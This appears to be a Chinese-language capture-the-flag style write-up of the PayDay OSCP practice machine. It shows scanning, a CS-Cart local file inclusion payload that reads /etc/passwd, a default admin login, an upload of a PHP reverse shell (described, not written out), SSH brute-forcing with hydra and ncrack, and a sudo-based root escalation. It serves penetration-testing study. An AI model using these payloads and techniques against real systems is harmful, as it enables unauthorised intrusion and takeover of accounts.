## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP]
└─$ sudo nmap -A -sV -sS -T4 192.168.169.39
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-17 22:46 CST
Nmap scan report for 192.168.169.39
Host is up (0.26s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey:
|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL TOP STLS RESP-CODES SASL CAPA PIPELINING
|_ssl-date: 2023-08-17T14:47:13+00:00; +6s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
|_ssl-date: 2023-08-17T14:47:13+00:00; +6s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_imap-capabilities: completed THREAD=REFERENCES UNSELECT Capability NAMESPACE STARTTLS LOGINDISABLEDA0001 LITERAL+ MULTIAPPEND SORT LOGIN-REFERRALS IDLE OK CHILDREN SASL-IR IMAP4rev1
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
|_ssl-date: 2023-08-17T14:47:12+00:00; +5s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_imap-capabilities: THREAD=REFERENCES UNSELECT completed Capability NAMESPACE CHILDREN LITERAL+ MULTIAPPEND SORT LOGIN-REFERRALS IDLE OK AUTH=PLAINA0001 SASL-IR IMAP4rev1
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
995/tcp open  ssl/pop3    Dovecot pop3d
|_ssl-date: 2023-08-17T14:47:12+00:00; +5s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_pop3-capabilities: UIDL TOP CAPA RESP-CODES SASL(PLAIN) USER PIPELINING
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/17%OT=22%CT=1%CU=33581%PV=Y%DS=4%DC=T%G=Y%TM=64DE32E
OS:F%P=aarch64-unknown-linux-gnu)SEQ(SP=DE%GCD=1%ISR=EF%TI=Z%II=I%TS=7)OPS(
OS:O1=M54EST11NW5%O2=M54EST11NW5%O3=M54ENNT11NW5%O4=M54EST11NW5%O5=M54EST11
OS:NW5%O6=M54EST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(
OS:R=Y%DF=Y%T=40%W=16D0%O=M54ENNSNW5%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=9E08%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name:
|   Domain name:
|   FQDN: payday
|_  System time: 2023-08-17T10:47:03-04:00
|_clock-skew: mean: 40m06s, deviation: 1h38m00s, median: 5s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   313.88 ms 192.168.45.1
2   313.77 ms 192.168.45.254
3   313.96 ms 192.168.251.1
4   314.30 ms 192.168.169.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.87 seconds
```

看到 80 port 有跑 CS-Cart web service

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/PayDay]
└─$ dirsearch -u http://192.168.169.39/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: 48890.txt | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/ouyang/.dirsearch/reports/192.168.169.39/-_23-08-19_14-31-53.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-08-19_14-31-53.log

Target: http://192.168.169.39/

[14:31:55] Starting:
[14:32:08] 403 -  314B  - /.htaccess.orig
[14:32:08] 403 -  316B  - /.htaccess.sample
[14:32:08] 403 -  314B  - /.htaccess.save
[14:32:08] 403 -  314B  - /.htaccess.bak1
[14:32:08] 403 -  311B  - /.ht_wsr.txt
[14:32:08] 403 -  312B  - /.htaccess_sc
[14:32:08] 403 -  312B  - /.htaccessBAK
[14:32:08] 403 -  314B  - /.htaccess_orig
[14:32:08] 403 -  313B  - /.htaccessOLD2
[14:32:08] 403 -  315B  - /.htaccess_extra
[14:32:08] 403 -  311B  - /.httr-oauth
[14:32:08] 403 -  310B  - /.htpasswds
[14:32:08] 403 -  305B  - /.html
[14:32:08] 403 -  312B  - /.htaccessOLD
[14:32:08] 403 -  304B  - /.htm
[14:32:08] 403 -  314B  - /.htpasswd_test
[14:32:33] 200 -    1B  - /Thumbs.db
[14:32:44] 301 -  335B  - /addons  ->  http://192.168.169.39/addons/
[14:32:45] 200 -    9KB - /admin
[14:32:46] 200 -    9KB - /admin/
[14:32:46] 200 -    9KB - /admin/.config
[14:32:46] 200 -    9KB - /admin/_logs/access_log
[14:32:46] 200 -    9KB - /admin/_logs/err.log
[14:32:46] 200 -    9KB - /admin/?/login
[14:32:46] 200 -    9KB - /admin/_logs/error.log
[14:32:46] 200 -    9KB - /admin/_logs/login.txt
[14:32:46] 200 -    9KB - /admin/_logs/error_log
[14:32:46] 200 -    9KB - /admin/account
[14:32:46] 200 -    9KB - /admin/access_log
[14:32:46] 200 -    9KB - /admin/_logs/error-log
[14:32:46] 200 -    9KB - /admin/_logs/access.log
[14:32:46] 200 -    9KB - /admin/.htaccess
[14:32:46] 200 -    9KB - /admin/_logs/access-log
[14:32:47] 200 -    9KB - /admin/backup/
[14:32:47] 200 -    9KB - /admin/backups/
[14:32:47] 200 -    9KB - /admin/controlpanel
[14:32:47] 200 -    9KB - /admin/admin
[14:32:47] 200 -    9KB - /admin/admin-login
[14:32:47] 200 -    9KB - /admin/adminLogin.48890.txt
[14:32:47] 200 -    9KB - /admin/admin-login.48890.txt
[14:32:47] 200 -    9KB - /admin/adminLogin
[14:32:47] 200 -    9KB - /admin/admin.48890.txt
[14:32:47] 200 -    9KB - /admin/admin/login
[14:32:47] 200 -    9KB - /admin/admin_login.48890.txt
[14:32:47] 200 -    9KB - /admin/admin_login
[14:32:47] 200 -    9KB - /admin/controlpanel.48890.txt
[14:32:47] 200 -    9KB - /admin/config.php
[14:32:47] 200 -    9KB - /admin/access.log
[14:32:47] 200 -    9KB - /admin/access.txt
[14:32:47] 200 -    9KB - /admin.php
[14:32:47] 200 -    9KB - /admin/account.48890.txt
[14:32:47] 200 -    9KB - /admin/default.asp
[14:32:47] 200 -    9KB - /admin/cp.48890.txt
[14:32:47] 200 -    9KB - /admin/cp
[14:32:47] 200 -    9KB - /admin/db/
[14:32:47] 200 -    9KB - /admin/default
[14:32:47] 200 -    9KB - /admin/default/login.asp
[14:32:47] 200 -    9KB - /admin/download.php
[14:32:47] 200 -    9KB - /admin/dumper/
[14:32:47] 200 -    9KB - /admin/default/admin.asp
[14:32:47] 200 -    9KB - /admin/error.log
[14:32:47] 200 -    9KB - /admin/error.txt
[14:32:47] 200 -    9KB - /admin/error_log
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[14:32:47] 200 -    9KB - /admin/export.php
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[14:32:47] 200 -    9KB - /admin/FCKeditor
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[14:32:47] 200 -    9KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[14:32:48] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
[14:32:48] 200 -    9KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[14:32:48] 200 -    9KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[14:32:48] 200 -    9KB - /admin/includes/configure.php~
[14:32:48] 200 -    9KB - /admin/home.48890.txt
[14:32:48] 200 -    9KB - /admin/index
[14:32:48] 200 -    9KB - /admin/index.48890.txt
[14:32:48] 200 -    9KB - /admin/js/tiny_mce
[14:32:48] 200 -    9KB - /admin/js/tiny_mce/
[14:32:48] 200 -    9KB - /admin/js/tinymce
[14:32:48] 200 -    9KB - /admin/js/tinymce/
[14:32:48] 200 -    9KB - /admin/login
[14:32:48] 200 -    9KB - /admin/log
[14:32:48] 200 -    9KB - /admin/login.48890.txt
[14:32:48] 200 -    9KB - /admin/login.asp
[14:32:48] 200 -    9KB - /admin/login.do
[14:32:48] 200 -    9KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
[14:32:48] 200 -    9KB - /admin/file.php
[14:32:48] 200 -    9KB - /admin/files.php
[14:32:48] 200 -    9KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
[14:32:48] 200 -    9KB - /admin/home
[14:32:48] 200 -    9KB - /admin/login.htm
[14:32:48] 200 -    9KB - /admin/logs/access-log
[14:32:48] 200 -    9KB - /admin/logs/err.log
[14:32:48] 200 -    9KB - /admin/manage
[14:32:48] 200 -    9KB - /admin/login.jsp
[14:32:48] 200 -    9KB - /admin/logs/
[14:32:48] 200 -    9KB - /admin/login.html
[14:32:48] 200 -    9KB - /admin/login.php
[14:32:48] 200 -    9KB - /admin/login.rb
[14:32:48] 200 -    9KB - /admin/logon.jsp
[14:32:49] 200 -    9KB - /admin/pma/
[14:32:49] 200 -    9KB - /admin/logs/access.log
[14:32:49] 200 -    9KB - /admin/PMA/index.php
[14:32:49] 200 -    9KB - /admin/manage/login.asp
[14:32:49] 200 -    9KB - /admin/login.py
[14:32:49] 200 -    9KB - /admin/logs/error.log
[14:32:49] 200 -    9KB - /admin/logs/error-log
[14:32:49] 200 -    9KB - /admin/logs/error_log
[14:32:49] 200 -    9KB - /admin/logs/login.txt
[14:32:49] 200 -    9KB - /admin/mysql/index.php
[14:32:49] 200 -    9KB - /admin/logs/access_log
[14:32:49] 200 -    9KB - /admin/phpMyAdmin
[14:32:49] 200 -    9KB - /admin/phpMyAdmin/
[14:32:49] 200 -    9KB - /admin/mysql2/index.php
[14:32:49] 200 -    9KB - /admin/pol_log.txt
[14:32:49] 200 -    9KB - /admin/pma/index.php
[14:32:49] 200 -    9KB - /admin/phpmyadmin/
[14:32:49] 200 -    9KB - /admin/phpMyAdmin/index.php
[14:32:49] 200 -    9KB - /admin/phpmyadmin/index.php
[14:32:49] 200 -    9KB - /admin/phpmyadmin2/index.php
[14:32:49] 200 -    9KB - /admin/pMA/
[14:32:49] 200 -    9KB - /admin/manage.asp
[14:32:49] 200 -    9KB - /admin/manage/admin.asp
[14:32:49] 200 -    9KB - /admin/mysql/
[14:32:49] 200 -    9KB - /admin/tiny_mce
[14:32:49] 200 -    9KB - /admin/release
[14:32:49] 200 -    9KB - /admin/portalcollect.php?f=http://xxx&t=js
[14:32:49] 200 -    9KB - /admin/sqladmin/
[14:32:49] 200 -    9KB - /admin/signin
[14:32:49] 200 -    9KB - /admin/private/logs
[14:32:49] 200 -    9KB - /admin/scripts/fckeditor
[14:32:49] 200 -    9KB - /admin/tinymce
[14:32:49] 200 -    9KB - /admin/uploads.php
[14:32:49] 200 -    9KB - /admin/secure/logon.jsp
[14:32:49] 200 -    9KB - /admin/sxd/
[14:32:49] 200 -    9KB - /admin/sysadmin/
[14:32:49] 200 -    9KB - /admin/user_count.txt
[14:32:49] 200 -    9KB - /admin/web/
[14:32:49] 200 -    9KB - /admin/upload.php
[14:33:07] 301 -  336B  - /catalog  ->  http://192.168.169.39/catalog/
[14:33:08] 403 -  308B  - /cgi-bin/
[14:33:11] 200 -    2KB - /classes/
[14:33:11] 301 -  336B  - /classes  ->  http://192.168.169.39/classes/
[14:33:13] 200 -   13B  - /config
[14:33:13] 200 -   13B  - /config.php
[14:33:14] 200 -   13B  - /config/app.yml
[14:33:14] 200 -   13B  - /config/app.php
[14:33:14] 200 -   13B  - /config/apc.php
[14:33:14] 200 -   13B  - /config/autoload/
[14:33:14] 200 -   13B  - /config/AppData.config
[14:33:14] 200 -   13B  - /config/
[14:33:14] 200 -   13B  - /config/aws.yml
[14:33:14] 200 -   13B  - /config/database.yml
[14:33:14] 200 -   13B  - /config/database.yml.pgsql
[14:33:14] 200 -   13B  - /config/db.inc
[14:33:14] 200 -   13B  - /config/database.yml.sqlite3
[14:33:14] 200 -   13B  - /config/database.yml_original
[14:33:14] 200 -   13B  - /config/config.ini
[14:33:14] 200 -   13B  - /config/databases.yml
[14:33:14] 200 -   13B  - /config/config.inc
[14:33:14] 200 -   13B  - /config/banned_words.txt
[14:33:14] 200 -   13B  - /config/database.yml~
[14:33:14] 200 -   13B  - /config/site.php
[14:33:14] 200 -   13B  - /config/xml/
[14:33:14] 200 -   13B  - /config/settings/production.yml
[14:33:14] 200 -   13B  - /config/initializers/secret_token.rb
[14:33:14] 200 -   13B  - /config/monkcheckout.ini
[14:33:14] 200 -   13B  - /config/monkid.ini
[14:33:14] 200 -   13B  - /config/development/
[14:33:14] 200 -   13B  - /config/settings.inc
[14:33:14] 200 -   13B  - /config/master.key
[14:33:14] 200 -   13B  - /config/producao.ini
[14:33:14] 200 -   13B  - /config/settings.ini
[14:33:14] 200 -   13B  - /config/settings.local.yml
[14:33:14] 200 -   13B  - /config/monkdonate.ini
[14:33:14] 200 -   13B  - /config/routes.yml
[14:33:14] 200 -   13B  - /config/settings.ini.cfm
[14:33:15] 301 -  333B  - /core  ->  http://192.168.169.39/core/
[14:33:20] 403 -  304B  - /doc/
[14:33:20] 403 -  308B  - /doc/api/
[14:33:20] 403 -  319B  - /doc/en/changes.html
[14:33:20] 403 -  319B  - /doc/html/index.html
[14:33:20] 403 -  318B  - /doc/stable.version
[14:33:32] 301 -  335B  - /images  ->  http://192.168.169.39/images/
[14:33:32] 200 -    2KB - /image
[14:33:32] 302 -    0B  - /images/  ->  ../index.php
[14:33:32] 301 -  336B  - /include  ->  http://192.168.169.39/include/
[14:33:32] 302 -    0B  - /include/  ->  ../index.php
[14:33:33] 200 -   13B  - /init/
[14:33:34] 200 -   27KB - /index
[14:33:34] 200 -   27KB - /index.php/login/
[14:33:34] 200 -    8KB - /install
[14:33:34] 200 -   27KB - /index.php
[14:33:34] 200 -    8KB - /install.php
[14:33:34] 200 -    8KB - /install/
[14:33:34] 200 -    8KB - /install/update.log
[14:33:34] 200 -    8KB - /install/index.php?upgrade/
[14:33:56] 301 -  337B  - /payments  ->  http://192.168.169.39/payments/
[14:34:14] 403 -  314B  - /server-status/
[14:34:14] 403 -  313B  - /server-status
[14:34:18] 301 -  334B  - /skins  ->  http://192.168.169.39/skins/
[14:34:32] 301 -  332B  - /var  ->  http://192.168.169.39/var/
[14:34:32] 302 -    0B  - /var/  ->  ../index.php
```

透過 searchsploit 發現有 LFI & Authenticated RCE 漏洞

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/PayDay]
└─$ searchsploit CS-Cart
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
CS-Cart - Multiple SQL Injections                                                          | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting                                           | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                                                          | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion                                        | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting                                         | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                                                          | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                                                      | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection                                          | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injection                                     | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection                                               | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery                                                 | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection                                             | php/webapps/40770.txt
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

依照 48890.txt，嘗試訪問

```http
http://192.168.169.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
```

成功 LFI

```json
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh dhcp:x:100:101::/nonexistent:/bin/false syslog:x:101:102::/home/syslog:/bin/false klog:x:102:103::/home/klog:/bin/false mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false postfix:x:105:112::/var/spool/postfix:/bin/false sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
Fatal error: Class 'PHPMailer' not found in /var/www/classes/phpmailer/class.cs_phpmailer.php on line 6
```

沒發現可利用 credential，接著嘗試用弱密碼登入 CS-Cart

```json
admin / admin
```

成功登入！(需要從 /admin 頁面登入)

	重連 VPN，IP 換成 192.168.155.39

登入後透過 Template Editor 上傳 php reverse shell，依照 48891.txt 的說明，副檔名要改成 phtml，上傳後用 nc 監聽，執行成功 get shell!

### 提權

上傳 linpeas.sh 執行後發現，
```json
╔══════════╣ Searching passwords in config PHP files
$db_password = 'root';
```

但直接 su root 失敗，嘗試用 hydra 破解 patrick 密碼 (一般應該用 rockyou.txt，這次只嘗試 account name)

```json
╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(dhcp) gid=101(dhcp) groups=101(dhcp)
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)
```

破解出密碼為 patrick，嘗試用 ssh 登入

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/PayDay]
└─$ ncrack 192.168.155.39 -U user.txt -P user.txt -p ssh -f -v

Starting Ncrack 0.7 ( http://ncrack.org ) at 2023-08-20 16:14 CST

Discovered credentials on ssh://192.168.155.39:22 'patrick' 'patrick'
ssh://192.168.155.39:22 finished.

Discovered credentials for ssh on 192.168.155.39 22/tcp:
192.168.155.39 22/tcp ssh: 'patrick' 'patrick'

Ncrack done: 1 service scanned in 6.01 seconds.
Probes sent: 1 | timed-out: 0 | prematurely-closed: 0

Ncrack finished.
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/PayDay]
└─$ hydra -L user.txt -P user.txt -e nsr -t 4 192.168.155.39 ssh -f
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-20 16:18:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://192.168.155.39:22/
[22][ssh] host: 192.168.155.39   login: patrick   password: patrick
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-20 16:18:21
```

登入後發現所有指令皆可用 sudo 執行

```json
patrick@payday:~$ sudo -l
User patrick may run the following commands on this host:
    (ALL) ALL
```

透過 password: patrick 成功提權！